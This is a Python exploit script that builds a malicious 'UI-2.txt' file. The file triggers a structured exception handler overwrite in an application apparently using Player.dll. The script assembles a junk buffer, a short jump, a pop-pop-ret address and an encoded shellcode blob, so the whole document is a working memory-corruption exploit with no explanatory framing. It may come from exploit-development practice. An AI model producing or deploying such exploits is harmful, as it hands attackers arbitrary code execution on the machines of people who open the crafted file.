import struct
# 588 overwrites first seh handler
# we need to place ptr_to_nex_seh-jump_shellcode to 584, and se_handler-pop-pop-ret into 588
junk = b"A" * 584
# Player.dll
# 0x1001B883      pop edi - pop - ret

nextSEHoverwrite = b"\xeb\x06\x90\x90" # jmp 6 bytes

SEHoverwrite = struct.pack("<I", 0x1001E812)

junk2 = b"\x90" * 1000

shellcode = b"\xcc" * 10
shellcode =  b""
shellcode += b"\xd9\xcd\xd9\x74\x24\xf4\x5e\xba\xca\x3c\xe7\x9b\x33"
shellcode += b"\xc9\xb1\x31\x31\x56\x18\x03\x56\x18\x83\xc6\xce\xde"
shellcode += b"\x12\x67\x26\x9c\xdd\x98\xb6\xc1\x54\x7d\x87\xc1\x03"
shellcode += b"\xf5\xb7\xf1\x40\x5b\x3b\x79\x04\x48\xc8\x0f\x81\x7f"
shellcode += b"\x79\xa5\xf7\x4e\x7a\x96\xc4\xd1\xf8\xe5\x18\x32\xc1"
shellcode += b"\x25\x6d\x33\x06\x5b\x9c\x61\xdf\x17\x33\x96\x54\x6d"
shellcode += b"\x88\x1d\x26\x63\x88\xc2\xfe\x82\xb9\x54\x75\xdd\x19"
shellcode += b"\x56\x5a\x55\x10\x40\xbf\x50\xea\xfb\x0b\x2e\xed\x2d"
shellcode += b"\x42\xcf\x42\x10\x6b\x22\x9a\x54\x4b\xdd\xe9\xac\xa8"
shellcode += b"\x60\xea\x6a\xd3\xbe\x7f\x69\x73\x34\x27\x55\x82\x99"
shellcode += b"\xbe\x1e\x88\x56\xb4\x79\x8c\x69\x19\xf2\xa8\xe2\x9c"
shellcode += b"\xd5\x39\xb0\xba\xf1\x62\x62\xa2\xa0\xce\xc5\xdb\xb3"
shellcode += b"\xb1\xba\x79\xbf\x5f\xae\xf3\xe2\x35\x31\x81\x98\x7b"
shellcode += b"\x31\x99\xa2\x2b\x5a\xa8\x29\xa4\x1d\x35\xf8\x81\xd2"
shellcode += b"\x7f\xa1\xa3\x7a\x26\x33\xf6\xe6\xd9\xe9\x34\x1f\x5a"
shellcode += b"\x18\xc4\xe4\x42\x69\xc1\xa1\xc4\x81\xbb\xba\xa0\xa5"
shellcode += b"\x68\xba\xe0\xc5\xef\x28\x68\x24\x8a\xc8\x0b\x38"

payload = junk + nextSEHoverwrite + SEHoverwrite + shellcode + junk2

f = open("UI-2.txt", "wb")
f.write(payload)
f.close()
